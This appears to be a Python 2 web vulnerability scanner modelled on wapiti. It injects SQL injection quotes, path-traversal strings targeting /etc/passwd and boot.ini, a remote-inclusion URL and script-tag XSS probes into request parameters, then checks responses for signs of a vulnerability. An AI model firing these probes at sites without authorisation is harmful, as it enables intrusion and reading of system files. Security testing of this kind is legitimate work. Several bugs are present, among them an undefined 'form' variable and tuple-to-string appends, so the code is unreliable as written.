#!/usr/bin/env python


import sys,urllib,httplib,urlparse,socket,re
import os
import time
class wapiti:
    """
a web application vulnerabiliity scanner
url     get:http://www.a.cn/a.php?id=11&c=2   post:http://www.a.cn/a.php
forms   post data [['http://www.a.cn/1.php',{'a':'11','b':"3443"}],['http://test',{'a':'1','b':"3"}]]
method  get or post
server  host
"""
    url=""
    forms=[]
    method=""
    attackedGET=[]
    attackedPOST=[]
    server=""  # host
    fdata=""

    def __init__(self):
        pass

    def scan(self,rooturl,data,dmethod):
        self.server=urlparse.urlparse(rooturl)[1]
        self.urls=rooturl
        self.forms=data
        self.method=dmethod
           #socket.setdefaulttimeout(5)
        if self.method =="0" :
          self.fdata+= "\nAttacking urls (GET)..."
          self.fdata+=  "-----------------------"
          try:
            self.attackGET(self.urls)
          except:
            pass

        elif self.method =="1":
          self.fdata+= "Attacking forms (POST)..."
          self.fdata+= "-------------------------"
          if form[1]!={}:
              self.attackPOST(form)
        else:
          self.fdata+= "Attacking error"

    def writefile(self,fdata):
        for i in range(len(fdata)):
            self.fdata += fdata[i]

    def attackGET(self,url):
        page=url.split('?')[0]
        query=url.split('?')[1]
        params=query.split('&')
        dict={}
        for param in params:
            if param.split('=')[0]:
                dict[param.split('=')[0]]=param.split('=')[1]
        self.attackPHP(page,dict)
        self.attackSQL(page,dict)
        self.attackXSS(page,dict)

    def attackPOST(self,form):
        self.attackSQL_POST(form)
        self.attackPHP_POST(form)
        self.attackXSS_POST(form)

    def attackSQL(self,page,dict):
        payload="'\""
        for k in dict.keys():
          tmp=dict.copy()
          tmp[k]=payload
          url=page+"?"+urllib.urlencode(tmp)
          if url not in self.attackedGET:
            conn=httplib.HTTPConnection(self.server)
            conn.request('GET',url)
            try:
              response=conn.getresponse()
              data=response.read()
            except socket.timeout:
              data=""
            conn.close()
            if data.find("supplied argument is not a valid MySQL")>0:
              self.fdata+= "MySQL Injection found with" + url
            if data.find("[Microsoft][ODBC Microsoft Access Driver]")>=0:
              self.fdata+= "MSSQL Injection foudn with" + url
            self.attackedGET.append(url)

    def attackPHP(self,page,dict):
        payloads=["/etc/passwd\0", "c:\\\\boot.ini", "http://www.google.fr/",
                  "../../../../../../../../../../etc/passwd\0", # /.. is similar to / so one such payload is enough :)
                  "../../../boot.ini\0","../../../../boot.ini\0","../../../../../boot.ini\0","../../../../../../boot.ini\0"]
        for payload in payloads:
          for k in dict.keys():
            tmp=dict.copy()
            tmp[k]=payload
            url=page+"?"+urllib.urlencode(tmp)
            if url not in self.attackedGET:
              conn=httplib.HTTPConnection(self.server)
              conn.request('GET',url)
              try:
                response=conn.getresponse()
                data=response.read()
              except socket.timeout:
                data=""
              conn.close()
              if data.find("root:x:0:0")>=0:
                self.fdata+= "Found unix inclusion/fread with" + url
              if data.find("[boot loader]")>=0:
                self.fdata+= "Found windows inclusion/fread with" + url
              if data.find("<title>Google</title>")>0:
                self.fdata+= "Found remote inclusion with" + url
#              if data.find("fread(): supplied argument is not")>0:
#                self.fdata+= "Found fread error with",url
#              if data.find("for inclusion (include_path=")>0:
#                self.fdata+= "Found include error with",url
              self.attackedGET.append(url)

    def attackXSS(self,page,dict):
        for k in dict.keys():
          tmp=dict.copy()
          payload="<script>var wapiti_"
#          for i in range(len(page)):
#            payload+="%02x" % ord(page[i])
          payload+=page.encode("hex_codec")
          payload+="_"
#          for i in range(len(k)):
#            payload+="%02x" % ord(k[i])
          payload+=k.encode("hex_codec")
          payload+="=new Boolean();</script>"
          tmp[k]=payload
          url=page+"?"+urllib.urlencode(tmp)
          if url not in self.attackedGET:
            conn=httplib.HTTPConnection(self.server)
            conn.request('GET',url)
            try:
              response=conn.getresponse()
              data=response.read()
            except socket.timeout:
              data=""
            conn.close()
            if data.find(payload)>0:
              #self.fdata+= "Found XSS with",url
              outdata= url,k,"GET","XSS"
              self.writefile(outdata)
            self.attackedGET.append(url)


    def attackSQL_POST(self,form):
        payload="'\""
        page=form[0]
        dict=form[1]
        for k in dict.keys():
          tmp=dict.copy()
          tmp[k]=payload
          if (page,tmp) not in self.attackedPOST:
            headers={"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
            conn=httplib.HTTPConnection(self.server)
            conn.request('POST',page,urllib.urlencode(tmp),headers)
            try:
              response=conn.getresponse()
              data=response.read()
            except socket.timeout:
              data=""
            conn.close()
            if data.find("supplied argument is not a valid MySQL")>0:
              self.fdata+= "SQL Injection found with" + page
              self.fdata+= "  and params =" + urllib.urlencode(tmp)
            self.attackedPOST.append((page,tmp))

    def attackPHP_POST(self,form):
        payloads=["/etc/passwd\00","c:\\\\boot.ini","http://www.google.fr/"]
        page=form[0]
        dict=form[1]
        for payload in payloads:
          for k in dict.keys():
            tmp=dict.copy()
            tmp[k]=payload
            if (page,tmp) not in self.attackedPOST:
              headers={"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
              conn=httplib.HTTPConnection(self.server)
              conn.request('POST',page,urllib.urlencode(tmp),headers)
              try:
                response=conn.getresponse()
                data=response.read()
              except socket.timeout:
                data=""
              conn.close()
              if data.find("root:x:0:0")>0:
                self.fdata+= "Found unix inclusion/fread with" + page
                self.fdata+= "  and params =" + urllib.urlencode(tmp)
              if data.find("[boot loader]")>0:
                self.fdata+= "Found windows inclusion/fread with" + page
                self.fdata+= "  and params =" + urllib.urlencode(tmp)
              if data.find("<title>Google</title>")>0:
                self.fdata+= "Found remote inclusion with" + page
                self.fdata+= "  and params =",urllib.urlencode(tmp)
              self.attackedPOST.append((page,tmp))

    def attackXSS_POST(self,form):
        page=form[0]
        dict=form[1]
        for k in dict.keys():
          tmp=dict.copy()
          payload="<script>var wapiti_"
#          for i in range(len(page)):
#            payload+="%02x" % ord(page[i])
          payload+=page.encode("hex_codec")
          payload+="_"
#          for i in range(len(k)):
#            payload+="%02x" % ord(k[i])
          payload+=k.encode("hex_codec")
          payload+="=new Boolean();</script>"
          tmp[k]=payload
          if (page,tmp) not in self.attackedPOST:
            headers={"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
            conn=httplib.HTTPConnection(self.server)
            conn.request('POST',page,urllib.urlencode(tmp),headers)
            try:
              response=conn.getresponse()
              data=response.read()
            except socket.timeout:
              data=""
            conn.close()
            if data.find(payload)>0:
              self.fdata+= "Found XSS with" + page
              self.fdata+= "  and params =" + urllib.urlencode(tmp)
            self.attackedPOST.append((page,tmp))

    def permanentXSS(self,url):
        conn=httplib.HTTPConnection(self.server)
        conn.request('GET',url)
        try:
          response=conn.getresponse()
          data=response.read()
        except socket.timeout:
          data=""
        conn.close()
        p=re.compile("<script>var wapiti_[0-9a-h]+_[0-9a-h]+=new Boolean\(\);</script>")
        for s in p.findall(data):
          s=s.split("=")[0].split('_')[1:]
          self.fdata+= "Found permanent XSS in" + url
          self.fdata+= "  attacked by" + s[0].decode("hex_codec") + "with field" + s[1].decode("hex_codec")

def webscan(url):
    global form
    wap=wapiti()
    formdata = {}
    isURL=url.split('?')
    if len(isURL) > 1:
        wap.scan(url, formdata, "0")
    return wap.fdata

